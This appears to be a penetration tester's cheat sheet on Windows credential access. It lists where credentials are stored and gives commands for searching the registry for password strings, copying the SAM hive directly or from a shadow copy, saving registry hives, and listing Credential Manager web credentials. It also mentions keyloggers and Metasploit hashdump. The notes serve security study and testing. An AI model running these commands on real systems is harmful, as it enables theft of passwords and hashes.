# Credential Access
Credentials are stored insecurely in various locations in systems:
    Clear-text files
    Database files
    Memory
    Password managers
    Enterprise Vaults
    Active Directory
    Network Sniffing

The following are some of the types of clear-text files that an attacker may be interested in:
    Commands history
    Configuration files (Web App, FTP files, etc.)
    Other Files related to Windows Applications (Internet Browsers, Email Clients, etc.)
    Backup files
    Shared files and folders
    Registry
    Source code 

Get-ADUser -Filter * -Properties * | select Name,SamAccountName,Description   
C:\Users\user> reg query HKLM /f SEARCHKEY_WORD /t REG_SZ /s
C:\Users\user> reg query HKCU /f SEARCHKEY_WORD /t REG_SZ /s

# Local Credds Dumping
KeyLogger

Metasploits HashDump

copy c:\Windows\System32\config\sam C:\Users\Administrator\Desktop\
copy c:\Windows\System32\config\hive C:\Users\Administrator\Desktop\ 

wmic shadowcopy call create Volume='C:\'
vssadmin list shadows
\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
Decrypt it!

\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\sam C:\users\Administrator\Desktop\sam

reg save HKLM\sam C:\users\Administrator\Desktop\sam-reg


# Credential Manager
vaultcmd /list
VaultCmd /listproperties:"Web Credentials"
VaultCmd /listcreds:"Web Credentials"
